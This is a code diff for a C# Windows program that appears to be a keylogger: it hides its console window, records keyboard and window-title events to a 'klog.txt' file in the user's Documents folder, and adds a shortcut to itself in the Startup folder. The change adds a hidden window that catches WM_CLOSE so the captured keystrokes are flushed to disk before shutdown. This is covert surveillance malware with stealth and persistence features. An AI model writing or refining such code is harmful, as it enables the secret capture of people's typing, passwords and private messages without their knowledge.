@@ -20,13 +20,8 @@ public static class Program
     public static unsafe void Main()
     {
         HideWindow();
-
-        // user logout/system shutdown events
-        SystemEvents.SessionEnding += (_, _) => { _ = CleanupHandler(); };
-        // ctrl+c, ctrl+break, program close events
-        // could use this to handle logout/shutdown, but it's much easier to use SystemEvents.SessionEnding because
-        // https://learn.microsoft.com/en-us/windows/console/setconsolectrlhandler#remarks
-        PInvoke.SetConsoleCtrlHandler(CleanupHandler, true);
+        // allows cleanup (buffer write) in case of WM_CLOSE message
+        CreateHiddenWindow();
 
         var logFile =
             new LogFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "klog.txt"));
@@ -59,6 +54,7 @@ public static class Program
             0,
             WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
 
+        // add the program to the startup directory
         AddToStartup();
 
         // set up message queue
@@ -106,14 +102,11 @@ public static class Program
     }
 
     /// <summary>
-    /// Handler for SetConsoleCtrlHandler. Cleanup when program is closing.
+    ///     Writes the buffer.
     /// </summary>
-    /// <param name="ctrlType"></param>
-    /// <returns></returns>
-    private static BOOL CleanupHandler(uint ctrlType = 7)
+    private static void HandleCleanup()
     {
         Buffer.Write();
-        return true;
     }
 
     /// <summary>
@@ -126,7 +119,7 @@ public static class Program
     }
 
     /// <summary>
-    /// Adds a shortcut to the executable to user's startup folder.
+    ///     Adds a shortcut to the executable to user's startup folder.
     /// </summary>
     private static void AddToStartup()
     {
@@ -141,6 +134,11 @@ public static class Program
         shortcut.Save();
     }
 
+    /// <summary>
+    ///      Gets the title of a window based on its <c>HWND</c>
+    /// </summary>
+    /// <param name="handle"><c>HWND</c> to be checked</param>
+    /// <returns>Title of the window</returns>
     private static unsafe string GetWindowTitle(HWND handle)
     {
         var strLength = PInvoke.GetWindowTextLength(handle) + 1;
@@ -152,12 +150,55 @@ public static class Program
         return string.Empty;
     }
 
+    /// <summary>
+    ///     Creates a hidden window to catch <c>WM_CLOSE</c> message and use it in <see cref="WindowProcedure"/>.
+    /// </summary>
+    private static unsafe void CreateHiddenWindow()
+    {
+        fixed (char* windowClassName = "klogclass")
+        {
+            // Register window class
+            var wndClass = new WNDCLASSW
+            {
+                lpfnWndProc = WindowProcedure,
+                lpszClassName = windowClassName
+            };
+            PInvoke.RegisterClass(wndClass);
+
+            var windowName = stackalloc char[0];
+            _ = PInvoke.CreateWindowEx(
+                WINDOW_EX_STYLE.WS_EX_LEFT,
+                windowClassName,
+                windowName,
+                0,
+                0, 0, 0, 0,
+                HWND.Null,
+                HMENU.Null,
+                HINSTANCE.Null,
+                null);
+        }
+    }
+
+    /// <summary>
+    ///     Clean up on WM_CLOSE.
+    /// </summary>
+    private static LRESULT WindowProcedure(HWND hwnd, uint uMsg, WPARAM wParam, LPARAM lParam)
+    {
+        if (uMsg == WM_CLOSE)
+        {
+            HandleCleanup();
+        }
+        return PInvoke.DefWindowProc(hwnd, uMsg, wParam, lParam);
+    }
+
     // ReSharper disable InconsistentNaming
     // codes passed by the keyboard hook
     private const int KEYDOWN = 0x0100;
     private const int KEYUP = 0x0101;
 
     private const int SYSKEYDOWN = 0x0104;
+
+    private const int WM_CLOSE = 0x0010;
 
     // reference https://referencesource.microsoft.com/#UIAutomationClient/MS/Win32/NativeMethods.cs,f66435563fb4ebdf,references
     private const int WINEVENT_OUTOFCONTEXT = 0x0000;
